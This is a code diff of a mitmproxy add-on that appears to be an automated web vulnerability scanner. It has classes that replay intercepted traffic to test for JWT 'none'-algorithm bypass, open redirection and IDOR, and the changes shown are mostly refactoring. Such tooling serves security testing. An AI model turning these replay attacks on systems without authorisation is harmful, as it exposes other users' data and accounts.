@@ -1,9 +1,8 @@
-import base64
 import json
 from mitmproxy import http
 from helpers import *
-from constants import URL_REGEX_STRING, PATH_REGEX_STRING
-import re, tldextract, json, hashlib
+import json, hashlib
+
 
 class RerouteAgent:
     # sample add-on that reroutes the request or stops it according to certain rules
@@ -27,6 +26,7 @@ class RequestLogger:
             print(dict(flow.request.cookies) == dict(flow.request.cookies))
         print(flow.request.query)
         print(flow.request.path_components)
+
 
 class JWTNoneAlgAttack:
     BENCHMARK_LABEL = 'JWT_NONE_ALG_BENCHMARK' # label for the benchmark failing flow
@@ -66,13 +66,14 @@ class JWTNoneAlgAttack:
             replay_flow(attack_flow)
         elif flow.label == self.ATTACK_LABEL:    
             if flow.benchmark_hash != hash(flow.response.text):
-                print('__' * 25)
+                print('--' * 25)
                 print(self.ATTACK_LABEL, 'SUCCESS!!', flow.request.pretty_url)
-                print('__' * 25, '\n')
+                print('--' * 25, '\n')
             else:
                 pass # attack failed
         else:
             pass # not a replayed request
+
 
 class OpenRedirectionAttack:
     REF_ATTACK_URL = 'http://google.com'
@@ -184,7 +185,7 @@ class IdorAttack:
 
 
     def is_attack_successful(self, flow: http.HTTPFlow):
-        return self.get_response_fingerprint(flow) == flow.request.TARGET_RESP_FINGERPRINT
+        return self.get_response_fingerprint(flow) == flow.TARGET_RESP_FINGERPRINT
 
 
     def request(self, flow: http.HTTPFlow):
@@ -194,9 +195,9 @@ class IdorAttack:
 
 
     def response(self, flow: http.HTTPFlow):
-        if hasattr(flow.request, 'label') and flow.request.label == self.ATTACK_LABEL:
-            if self.is_attack_successful(flow):
-                print('FOUND IDOR in ', flow.request.path)
+        if hasattr(flow, 'label'):
+            if flow.label == self.ATTACK_LABEL and self.is_attack_successful(flow):
+                print('FOUND IDOR in', flow.request.path)
             return
         
         request_token = self.get_request_token(flow)
@@ -209,7 +210,7 @@ class IdorAttack:
 
         if self.is_idor_possible(request_token):
             # test idor here
-            print('********** IDOR possible in: ', request_token)
+            # print('********** IDOR possible in: ', request_token)
             
             other_path_obj = [
                 path_obj for path_obj
@@ -221,6 +222,6 @@ class IdorAttack:
             
             target_flow = other_path_obj['flow']
             attack_flow = flow.copy()
-            attack_flow.request.label = self.ATTACK_LABEL
-            attack_flow.request.TARGET_RESP_FINGERPRINT = self.get_response_fingerprint(target_flow)
-            replay_flow(attack_flow, self.ATTACK_LABEL)
+            attack_flow.label = self.ATTACK_LABEL
+            attack_flow.TARGET_RESP_FINGERPRINT = self.get_response_fingerprint(target_flow)
+            replay_flow(attack_flow)
